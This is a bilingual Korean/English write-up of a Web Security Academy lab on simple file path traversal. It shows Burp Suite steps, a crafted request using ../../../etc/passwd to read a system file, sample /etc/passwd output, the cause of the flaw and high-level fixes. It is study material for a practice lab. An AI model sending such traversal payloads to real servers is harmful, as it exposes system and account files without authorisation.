# File Path Traversal (Simple Case)

> Lab: **File path traversal, simple case** — Web Security Academy  
> Status: **Solved**

![Lab notes](images/file-path-traversal.jpg)

---

## 한국어

### 한 줄 요약

서버가 이미지를 `기준경로 + filename` 으로만 열어 주면,  
`filename=../../../etc/passwd` 로 **웹 루트 밖 파일**을 읽을 수 있다.

### 재현 단계 (Burp Suite)

1. 상품 페이지를 연다 (`/product?productId=...`).
2. Burp **HTTP history** 에서 이미지 요청을 찾는다.  
   - 예: `GET /image?filename=17.jpg`
3. 요청을 **Repeater** 로 보낸다.  
   (Intercept를 꼭 켤 필요는 없음. History → Repeater 로 충분.)
4. `filename` 값을 수정한다.

```http
GET /image?filename=../../../etc/passwd HTTP/2
Host: <lab-host>.web-security-academy.net
```

5. **Send** 후 응답 본문에 다음이 보이면 성공:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

### 메모 (실습 시 적은 내용)

| 관찰 | 의미 |
|------|------|
| `/image?filename=17.jpg` | 상품 이미지를 가져오는 요청 |
| Burp로 요청 후 Repeater | 가로채기 없이도 history에서 수정 가능 |
| `filename` 경로 변경 | `../../../etc/passwd` |
| 응답 | `/etc/passwd` 내용 획득 (`Content-Type` 이 image/jpeg 이어도 본문은 텍스트) |

### 왜 되는가

대략 서버 내부는 이런 식이다:

```text
open("/var/www/images/" + user_filename)
```

| filename | 실제 경로 (개념) |
|----------|------------------|
| `17.jpg` | `/var/www/images/17.jpg` |
| `../../../etc/passwd` | `/etc/passwd` (상위 디렉터리 3번) |

검증·정규화 없이 문자열을 이어 붙이면 **Directory / Path Traversal** 이 된다.

### `/etc/passwd` 응답을 읽는 법

형식:

```text
이름:암호필드:UID:GID:설명:홈:셸
```

- `root:x:0:0:...` → 관리자 계정 존재 확인  
- `x` → 비밀번호는 보통 `/etc/shadow` 쪽 (이 파일만으로는 로그인 불가)  
- 랩 환경에는 `carlos`, `peter` 등 연습용 계정이 보이기도 함  

### 파이썬으로 같은 요청 보내기

```bash
python ../tools/path_traversal_lab.py https://YOUR-LAB.web-security-academy.net/
```

---

## English

### One-liner

If the app opens files as `base_dir + filename` with no sanitization,  
setting `filename=../../../etc/passwd` can read files **outside** the image directory.

### Steps (Burp)

1. Open a product page.
2. In **HTTP history**, find `GET /image?filename=...`.
3. **Send to Repeater** (Intercept optional).
4. Change the parameter:

```http
GET /image?filename=../../../etc/passwd HTTP/2
```

5. Confirm the body contains `/etc/passwd` lines such as `root:x:0:0:`.

### Takeaway

Path traversal is not about “breaking encryption”; it is about **trusting user-controlled path segments**.  
Fix ideas (high level): reject `..`, resolve canonical paths and enforce a root directory, use safe file IDs instead of raw paths.

### Automate (lab only)

```bash
python ../tools/path_traversal_lab.py https://YOUR-LAB.web-security-academy.net/
```
